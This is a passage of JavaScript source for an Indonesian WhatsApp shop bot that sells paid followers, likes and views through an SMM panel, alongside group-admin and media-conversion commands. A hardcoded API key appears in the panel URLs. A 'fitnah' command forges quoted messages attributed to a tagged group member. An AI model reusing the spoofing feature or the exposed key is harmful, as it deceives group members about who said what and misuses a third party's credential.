if (args.length < 1) return reply('jumlahnya berapa? minimal 10k')
var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=listwallet`)
let list = []
console.log(fetaa)
for (let L of fetaa.data) {
let no = 1
list.push({
buttonText: {displayText: L.wallet},
buttonId: `${prefix}tarikkomisikunci ${q}|${L.wallet}`,
type: `${no++}`
})}
let nyobb = list
conn.sendMessage(from, {text:`*PILLIH E-WALLET*\nPilih jenis wallet yang ingin anda gunakan!`, title: 'WALLET', footer: '©SosmedShop', buttons: nyobb})
}
break
case 'tarikkomisikunci':
if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 1) return m.reply('jumlahnya berapa bang')
let juml = q.split('|')[0] ? q.split('|')[0]: q
let walle = q.split('|')[1] ? q.split('|')[1]: ''
if (walle.length < 1) return reply(`Jumlah dan Target harus di isi!`)
var tarikom = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=withdraw&amount=${juml}&wallet=${walle}&nomor=${smm_dana_number}&an=${smm_dana_nama}`)
console.log(tarikom)
conn.sendMessage(from, {text: `${tarikom.data.msg}`}, {quoted:msg})
break
case 'clear':
case 'clearer':
case 'clearerr':{
if (!isOwner) return reply(mess.OnlyOwner)
server_eror.splice('[]')
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
reply('Done')
}
break
case 'error':{
if (!isOwner) return reply(mess.OnlyOwner)
var teks =`*ERROR SERVER*\n_Total Tercatatat_ : ${server_eror.length}\n\n`
var NO = 1
for (let i of server_eror){
teks +=`=> *ERROR (${NO++})*\n${i.error}\n\n`
}
reply(teks)
}
break
case 'order':
case 'caraorder': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
let capp = `*Hallo Kak Berikut Cara Order*\n\n*Followers :*\nex1 : _${prefix}followers jumlah|target [ tanpa (@) ]_\nex2 : _${prefix}followers 500|lexxy4554_\n\n*View :*\nex 1 : _${prefix}view jumlah|link_\nex 2 : _${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Like :*\nex 1 : _${prefix}like jumlah|link_\nex 2 : _${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda faham dengan penjelasan ini🙏\nbeli = faham`
conn.sendMessage(from, {text: capp}, {quoted:msg})
}
break
case 'view': case 'like': case 'follower': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (args.length < 1) return reply('Format tidak valid, jika masih belum mengerti ketik *#order*')
let juma = q.split('|')[0] ? q.split('|')[0]: q
let targtt = q.split('|')[1] ? q.split('|')[1]: ''
if (targtt.length < 1) return reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|lexxy456_`)
var fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=${command}`)
let list = []
var textplus = `${juma}|${targtt}`
for (let L of fetaa.data) {
list.push({
title: `${L.nama}`,
rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
description: `\n${L.desc}`
})
}
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: '© created by lexxy official',
  buttonText: "Click Here!",
  sections: [{
title: "Sosmed Shop",
  rows: list
}],
listType: 1
}
const sendMsg = await conn.sendMessage(from, listMessage)
break
}
case 'confirmorderkunci': { //KUNCI = BIAR GA DIAKSES HEHE
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (args.length < 1) return reply(`*Cara order followers*\n\n*Example :* _${command} jumlah|username tanpa (@)_\n*Example :* _${command} 500|lexxy2408_\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`)
let jumlah = q.split('|')[0] ? q.split('|')[0]: q
let targ = q.split('|')[1] ? q.split('|')[1]: ''
let idny = q.split('|')[2] ? q.split('|')[2]: ''
var feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`)
if (feta.status == false) {
  reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
let idpes = feta.data.order_id
let cap = `Hai *@${sender.split('@')[0]} 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! Menggunakan QRIS.\n\n*ID Pesanan :*\n${feta.data.order_id}\n\n*Target :*\n${targ}\n\n*Jumlah Order :* ${jumlah}\n*Total Harga :* Rp${toRupiah(feta.data.amount)}\n*Status Orderan :* ${feta.data.status}\n\n*info lebih lanjut?*\n*klik button dibawah.*`
var buto = [{buttonId: `!cekstatus ${feta.data.order_id}`, buttonText: { displayText: 'Check Status' }, type: 1 }]
conn.sendMessage(from, { caption: cap, image: { url: feta.data.qris }, buttons: buto, footer: '© created by lexxy official' })
}
console.log(feta)
}
break
case 'chekstatus':
case 'cekstatus': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (!q) return reply('id ordernya mana kak?')
var seta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=status&order_id=${q}`)
if (seta.status == false) {
var captionnye = `\nid order tidak di temukan`
} else {
var captionnye = `\n*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli jasa suntik dari kami, ditunggu next ordernya!`
}
reply(captionnye)
break
}

// STORE FUN
case 'shop': case 'list':
if (!isGroup) return reply(mess.OnlyGrup)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hi @${sender.split("@")[0]}`,
buttonText: 'Click Here!',
footer: `*List From ${groupName}*\n\n⏳ ${jam}\n📆 ${tanggal}`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
break
case 'addlist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
break
case 'dellist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'update':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil update List menu : *${args1}*`)
break
case 'tambah':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one + nilai_two}`)
break
case 'kurang':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one - nilai_two}`)
break
case 'kali':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one * nilai_two}`)
break
case 'bagi':
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one / nilai_two}`)
break
case 'p': case 'proses':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan : ${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`, [sender])
}
break
case 'd': case 'done':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya🙏`, [sender])
}
break
case 'setppbot':
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#setppbot* atau reply gambar yang sudah dikirim dengan pesan *#setppbot*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
conn.updateProfilePicture(botNumber, { url: media })
reply('Sukses Mengganti Profile Bot')
await sleep(2000)
fs.unlinkSync(media)
break
case 'git': case 'gitclone':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return reply('link githubnya mana?\n*Contoh:*\n#gitclone https://github.com/Lexxy24/MenfessV1')
var linknya = q
if (!regex1.test(linknya)) return reply('link salah!')
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
reply(`*Mohon tunggu, sedang mengirim repository..*`)
conn.sendMessage(from, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: msg }).catch((err) => reply('Maaf link github yang kamu berikan di private, dan tidak bisa di jadikan file'))
}
break

case 'fitnah':
if (!isGroup) return reply(mess.OnlyGrup)
if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
var org = q.split("|")[0]
var target = q.split("|")[1]
var bot = q.split("|")[2]
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
break

case 'del':
case 'delete':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break

case 'linkgrup': 
case 'linkgc':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break

case 'kick':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
conn.groupParticipantsUpdate(from, [number], "remove")
} else if (isQuotedMsg) {
number = quotedMsg.sender
conn.groupParticipantsUpdate(from, [number], "remove")
} else {
reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
}
break

case 'setppgrup': 
case 'setppgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
await conn.updateProfilePicture(from, { url: media })
await sleep(2000)
reply('Sukses mengganti foto profile group')
fs.unlinkSync(media)
break

case 'setnamegrup': 
case 'setnamegc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} teks`)
await conn.groupUpdateSubject(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break

case 'setdesc': 
case 'setdescription':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah ${command} teks`)
await conn.groupUpdateDescription(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break

case 'group': 
case 'grup':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
conn.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
conn.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break

case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
await conn.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break

case 'tagall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let teks_tagall = `*T A G - A L L*

*Pesan :* ${q ? q : 'Hallo'}\n\n`
for (let mem of participants) {
teks_tagall += `•> @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
break

case 'hidetag':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break

case 'welcome':{
if (!isGroup) return reply('Khusus Group!') 
if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return reply("Khusus admin!")
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isWelcome) return reply('Sudah aktif✓')
welcomeJson.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Suksess mengaktifkan welcome di group:\n'+groupName)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
welcomeJson.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Success menonaktifkan welcome di group:\n'+groupName)
} else { reply('Kata kunci tidak ditemukan!') }
}
break

case 'antilink':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break

case 'promote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

case 'tiktokauto':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAutoDownTT) return reply('Auto download tiktok sudah aktif')
auto_downloadTT.push(from)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mengaktifkan auto download tiktok')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAutoDownTT) return reply('Auto download tiktok belum aktif')
auto_downloadTT.splice(anu, 1)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mematikan auto download tiktok')
} else { reply('Kata kunci tidak ditemukan!') }
}
break

case 'demote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

case 'infogc':
case 'infogrup':
case 'infogroup':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
let cekgcnya =`*INFO GROUP*
• *ID:* ${from}
• *Name:* ${groupName}
• *Member:* ${groupMembers.length}
• *Total Admin:* ${groupAdmins.length}
• *Welcome:* ${isWelcome? "aktif":"tidak"}
• *Antilink:* ${isAntiLink? "aktif":"tidak"}
• *Tiktok Auto:* ${isAutoDownTT? "aktif":"tidak"}`
reply(cekgcnya)
break

case 'text_grup':{
const reactionMessage = { react: { text: "🗿", key: msg.key}}
conn.sendMessage(from, reactionMessage)
}
break

case 'tourl': 
case 'upload':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender.split("@")[0]}.webp`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Sticker`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
fs.unlinkSync(rand2)
} else if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
var rand2 = 'sticker/'+getRandom('.mp4')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Video`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
fs.unlinkSync(rand2)
} else if (isImage || isQuotedImage){
var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
reply(mess.wait)
let buffer_up = fs.readFileSync(mediany)
var rand2 = 'sticker/'+getRandom('.png')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Image`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(mediany)
fs.unlinkSync(rand2)
} else if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp3`)
var rand2 = 'sticker/'+getRandom('.mp3')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Audio`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp3`)
fs.unlinkSync(rand2)
} else {
reply(`*reply audio/video/sticker/gambar dengan pesan ${prefix+command}*`)
}
break

case 'tomp3':
case 'toaudio':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
let ran = './sticker/'+getRandom('.mp3')
fs.writeFileSync(`./${ran}`, media)
exec(`ffmpeg -i ${media} ${ran}`)
conn.sendMessage(from, { audio: fs.readFileSync(ran),  mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: msg })
fs.unlinkSync(ran)
fs.unlinkSync(media)
} else {
reply(`*Reply video dengan pesan ${prefix+command}*`)
}
break

case 'base64':
case 'base32':{
if (!q) return reply(`Example :\n${prefix+command} Lexxy`)
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=${command}&encode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.encode}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break

case 'debase64':{
if (!q) return reply(`Example :\n${prefix+command} cA==`)
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base64&decode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break

case 'debase32':{
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base32&decode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break

// CONVERT
case 'toimg': 
case 'toimage':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
var rand1 = 'sticker/'+getRandom('.webp')
var rand2 = 'sticker/'+getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
reply(mess.wait)
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
fs.unlinkSync(`./${rand1}`)
if (err) return reply(mess.error.api)
conn.sendMessage(from, {caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
})
} else {
reply('*Reply sticker nya dengan pesan #toimg*\n\n*Atau bisa sticker gif dengan pesan #tovideo*')
}
break

case 'tomp4': 
case 'tovideo':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
let buffer = `./sticker/${sender.split("@")[0]}.webp`
reply(mess.wait)
let webpToMp4 = await webp2mp4File(buffer)
conn.sendMessage(from, { video: {url:webpToMp4.result}, caption: 'Convert Webp To Video'}, { quoted: msg })
fs.unlinkSync(buffer)
} else {
reply('*Reply sticker gif dengan pesan #tovideo*')
}
break

case 'emojimix':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Kirim perintah ${command} emoji1+emoji2\ncontoh : !${command} 😜+😅`)
if (!q.includes('+')) return reply(`Format salah, contoh pemakaian !${command} 😅+😭`)
var emo1 = q.split("+")[0]
